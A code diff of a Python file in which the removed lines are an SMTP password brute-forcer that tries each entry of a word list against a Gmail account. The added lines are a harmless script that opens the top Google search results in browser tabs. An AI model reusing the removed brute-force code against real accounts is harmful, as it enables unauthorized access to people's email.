@@ -1,18 +1,23 @@
-import smtplib
+#! python3
+"""Opens several Google search results"""
 
-smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
-smtpserver.ehlo()
-smtpserver.starttls()
+import sys
+import webbrowser
+import requests
+import bs4
 
-user = "example@gmail.com"
-with open('words.txt', 'r') as f:
-	passwords = f.readlines()
+print("Googling.....")
 
-for password in passwords:
-	try:
-		smtpserver.login(user, password)
-		print("[+] Password Found: %s" % password)
-		break
+res = requests.get('http://google.com/search?q=' + ' '.join(sys.argv[1:]))
+res.raise_for_status()
 
-	except smtplib.SMTPAuthenticationError:
-		print("[!] Password incorrect: %s" % password)
+# Retrieve top search result links.
+soup = bs4.BeautifulSoup(res.text)
+
+# Open a browser tab for each result.
+links = soup.select('.r a')
+tabs = min(5, len(links))
+
+
+for i in range(tabs):
+    webbrowser.open('http://google.com' + links[i].get('href'))
